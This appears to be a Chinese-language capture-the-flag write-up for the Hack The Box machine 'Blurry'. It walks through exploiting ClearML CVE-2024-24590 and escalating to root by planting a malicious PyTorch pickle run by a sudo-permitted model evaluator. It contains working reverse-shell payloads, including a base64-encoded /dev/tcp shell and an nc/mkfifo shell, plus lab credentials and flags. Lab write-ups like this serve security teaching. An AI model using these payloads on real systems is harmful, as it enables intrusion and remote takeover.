###### tags: `Hack the box` `HTB` `Medium` `Linux`

# Blurry

```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.141.81 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.141.81:22
Open 10.129.141.81:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
|   256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp open  http    syn-ack nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

一樣先把`app.blurry.htb`跟`blurry.htb`加進`/etc/hosts`
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo nano /etc/hosts

10.129.141.81   app.blurry.htb
10.129.141.81   blurry.htb
```

進到`app.blurry.htb`可以看到一個`ClearML`，google可以找到[CVE-2024-24590](https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit/tree/main)，要記得先把環境改成python3，然後安裝`requirements.txt`
```
┌──(kali㉿kali)-[~/htb]
└─$ pyenv global 3.8.10

┌──(kali㉿kali)-[~/htb/CVE-2024-24590-ClearML-RCE-Exploit]
└─$ pip install -r requirements.txt
```

可以先安裝`pwncat`
```
┌──(kali㉿kali)-[~/htb/CVE-2024-24590-ClearML-RCE-Exploit]
└─$ pip install pwncat
```

用exploit要先選1設定一些東西
```
┌──(kali㉿kali)-[~/htb/CVE-2024-24590-ClearML-RCE-Exploit]
└─$ python3 exploit.py             

    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                                                                              
    ⠄⠄⠄⠄⠄⠄⠄⠄⣠⣴⣶⣾⣿⣿⣿⣷⣶⣤⣀⠄⠄⠄⠄⠄⠄⠄                                                                                                              
    ⠄⠄⠄⠄⠄⢀⣴⣿⣿⣿⡿⠿⠟⠛⠻⠿⣿⣿⣿⡷⠆⠄⠄⠄⠄⠄                                                                                                              
    ⠄⠄⠄⠄⢠⣿⣿⣿⠟⠁⠄⠄⠄⠄⠄⠄⠄⠉⠛⠁⠄⠄⠄⠄⠄⠄                                                                                                              
    ⠄⠄⠄⢠⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                                                                              
    ⠄⠄⠄⢸⣿⣿⡇⠄⠄⠄⠄⣠⣾⠿⢿⡶⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                                                                              
    ⠄⢸⣿⣿⣿⣿⡇⠄⠄⠄⠄⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                                                                              
    ⠄⠄⣿⣿⣿⣿⣷⡀⠄⠄⠄⠙⠿⣶⡾⠟⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                                                                              
    ⠄⠄⠘⣿⣿⣿⣿⣷⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⠄⠄⠄⠄⠄⠄⠄                                                                                                              
    ⠄⠄⠄⠘⢿⣿⣿⣿⣿⣷⣦⣤⣀⣀⣠⣤⣴⣿⣿⣷⠄⠄⠄⠄⠄⠄                                                                                                              
    ⠄⠄⠄⠄⠄⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄⠄⠄                                                                                                              
    ⠄⠄⠄⠄⠄⠄⠄⠈⠛⠻⠿⣿⣿⡏⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                                                                              
    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄                                                                                                              
                                                                                                                                            
CVE-2024-24590 - ClearML RCE
============================
[1] Initialize ClearML
[2] Run exploit
[0] Exit
[>] Choose an option: 1
[+] Initializing ClearML
[i] Press enter after pasting the configuration
ClearML SDK setup process

Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
Or create a free account at https://app.clear.ml/settings/workspace-configuration

In settings page, press "Create new credentials", then press "Copy to clipboard".

Paste copied configuration here:
```

前往`http://app.blurry.htb/settings/workspace-configuration`之後選`Create new credentials`，把下面的東西複製貼上
```
api { 
    web_server: http://app.blurry.htb
    api_server: http://api.blurry.htb
    files_server: http://files.blurry.htb
    credentials {
        "access_key" = "MS6AZEFPXR3BZXAYO3LQ"
        "secret_key"  = "65Da3vbhjme9r86N4NurMV7DtkxjsyRuzFnXwJvdM3IKZVGF6r"
    }
}

Detected credentials key="MS6AZEFPXR3BZXAYO3LQ" secret="65Da***"

ClearML Hosts configuration:
Web App: http://app.blurry.htb
API: http://api.blurry.htb
File Store: http://files.blurry.htb

Verifying credentials ...
Credentials verified!

New configuration stored in /home/kali/clearml.conf
ClearML setup completed successfully.
```

之後抓到`configuration`之後就可以選2，完成可得到shell
```
[>] Choose an option: 2
[+] Your IP: 10.10.14.29
[+] Your Port: 4444
[+] Target Project name Case Sensitive!: Black Swan
[+] Payload to be used: echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOS80NDQ0IDA+JjEi | base64 -d | sh
[?] Do you want to start a listener on 4444? (y/n): y
[+] pwncat listener started on 4444
[i] This exploit requires that another user deserializes the payload on their machine.
ClearML Task: created new task id=4d64be5c58b04106a5765cb2b67cbf8b
ClearML results page: http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/4d64be5c58b04106a5765cb2b67cbf8b/output/log
[i] Please wait...
ClearML Monitor: GPU monitoring failed getting GPU reading, switching off GPU monitoring
bash: cannot set terminal process group (4301): Inappropriate ioctl for device
bash: no job control in this shell
jippity@blurry:~$
```

在`/home/jippity`可得user.txt
```
jippity@blurry:~$ cat user.txt
32b7a9bdce362d81161c154c4ce9372c
```

因為一直有一些error訊息特地又拉一個shell出來
```
jippity@blurry:~$ /bin/sh -i >& /dev/tcp/10.10.14.29/4445 0>&1

┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4445

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
jippity@blurry:~$
```

查看`sudo -l`，可以搜尋到[PyTorch反序列化漏洞](https://blog.csdn.net/qq1198768105/article/details/129270288)
```
jippity@blurry:/models$ sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
```

自己撰寫`shell.py`，加上搜尋[Pytorch 儲存、載入模型](https://medium.com/chiachun0818/pytorch-%E5%84%B2%E5%AD%98-%E8%BC%89%E5%85%A5%E6%A8%A1%E5%9E%8B-3b32027e322f)
```python
import torch
import torch.nn as nn
import os

class CustomModel():   
    def __reduce__(self):
    	return(os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 4446 >/tmp/f',))
  
model_object = CustomModel()
torch.save(model_object, 'shell.pth')     
```

放到靶機內執行產生`shell.pth`，之後移到`/models`
```
jippity@blurry:/tmp$ wget 10.10.14.29/shell.py

jippity@blurry:/tmp$ python3 shell.py
jippity@blurry:/tmp$ ls
shell.pth
shell.py
systemd-private-f9b15848066943a3b09502f4571f1ea0-systemd-logind.service-4pjani
systemd-private-f9b15848066943a3b09502f4571f1ea0-systemd-timesyncd.service-MIO3hg
vmware-root_297-2126462102
jippity@blurry:/tmp$ mv shell.pth /models
```

開nc之後執行就得root，到/root得root.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4446 

jippity@blurry:/tmp$ sudo /usr/bin/evaluate_model /models/shell.pth
[+] Model /models/shell.pth is considered safe. Processing...

# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@blurry:~# cat root.txt
558163de8802905de915d1e5ca63577f
```